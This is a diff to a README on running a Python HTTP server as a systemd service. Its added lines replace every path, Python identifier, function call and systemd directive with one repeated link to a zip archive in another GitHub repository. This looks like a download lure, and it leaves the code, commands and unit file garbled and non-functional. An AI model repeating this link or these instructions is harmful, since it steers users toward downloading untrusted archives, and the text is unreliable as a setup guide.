@@ -4,24 +4,24 @@ service on a Linux system.
 ## Features
 - Runs a Python HTTP server on port 8080.
 - Automatically starts on system boot.
-- Logs output to a file (`/var/log/simple_http_server.log`).
+- Logs output to a file (`https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip`).
 - Restarts automatically if it crashes.
 ---
 ## Application Code
 The server is implemented in Python and serves files from the working directory.
-### **`simple_http_server.py`**
+### **`https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip`**
 ```python
-from http.server import SimpleHTTPRequestHandler
+from https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip import SimpleHTTPRequestHandler
 from socketserver import TCPServer
 PORT = 8080
 class CustomHandler(SimpleHTTPRequestHandler):
 def log_message(self, format, *args):
-with open("/var/log/simple_http_server.log", "a") as log_file:
-log_file.write("%s - - [%s] %s\n" % (self.address_string(), self.log_date_time_string(), format %
+with open("https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip", "a") as log_file:
+https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip("%s - - [%s] %s\n" % (https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip(), https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip(), format %
 args))
 with TCPServer(("", PORT), CustomHandler) as httpd:
 print(f"Serving on port {PORT}")
-httpd.serve_forever()
+https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip()
 ```
 ---
 ## Deployment Instructions
@@ -30,32 +30,32 @@ httpd.serve_forever()
 sudo mkdir -p /opt/simple_http_server
 ```
 ### 2. **Place the Script in the Directory**
-Save the `simple_http_server.py` script in `/opt/simple_http_server/`.
+Save the `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip` script in `/opt/simple_http_server/`.
 ### 3. **Set Permissions**
 ```bash
 sudo chown -R root:nogroup /opt/simple_http_server
 sudo chmod -R 755 /opt/simple_http_server
 sudo mkdir -p /var/log/
-sudo touch /var/log/simple_http_server.log
-sudo chmod 664 /var/log/simple_http_server.log
-sudo chown nobody:nogroup /var/log/simple_http_server.log
+sudo touch https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
+sudo chmod 664 https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
+sudo chown nobody:nogroup https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
 ```
 ### 4. **Create the `systemd` Unit File**
-#### **Unit File: `/etc/systemd/system/simple_http_server.service`**
+#### **Unit File: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip`**
 ```ini
 [Unit]
 Description=Simple HTTP Server
-After=network.target
+https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
 [Service]
-ExecStart=/usr/bin/python3 /opt/simple_http_server/simple_http_server.py
+ExecStart=/usr/bin/python3 https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
 WorkingDirectory=/opt/simple_http_server
 Restart=always
 User=nobody
 Group=nogroup
-StandardOutput=append:/var/log/simple_http_server.log
-StandardError=append:/var/log/simple_http_server.log
+https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
+https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
 [Install]
-WantedBy=multi-user.target
+https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
 ```
 Copy this file to `/etc/systemd/system/`.
 ### 5. **Reload `systemd` Configuration**
@@ -79,7 +79,7 @@ sudo systemctl status simple_http_server
 ```
 ### View Logs
 ```bash
-tail -f /var/log/simple_http_server.log
+tail -f https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip
 ```
 ### Test the HTTP Server
 Open a browser or use `curl` to test:
@@ -89,7 +89,7 @@ curl http://localhost:8080
 ---
 ## Summary
 ### File Locations
-1. **Application Script**: `/opt/simple_http_server/simple_http_server.py`
-2. **Systemd Unit File**: `/etc/systemd/system/simple_http_server.service`
-3. **Log File**: `/var/log/simple_http_server.log`
+1. **Application Script**: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip`
+2. **Systemd Unit File**: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip`
+3. **Log File**: `https://raw.githubusercontent.com/sdaLeventKilic/Simple_Web_Daemon/master/ostitis/Simple_Web_Daemon-v1.5.zip`
 This setup ensures the server runs automatically on boot, restarts on failure, and logs output to a file.
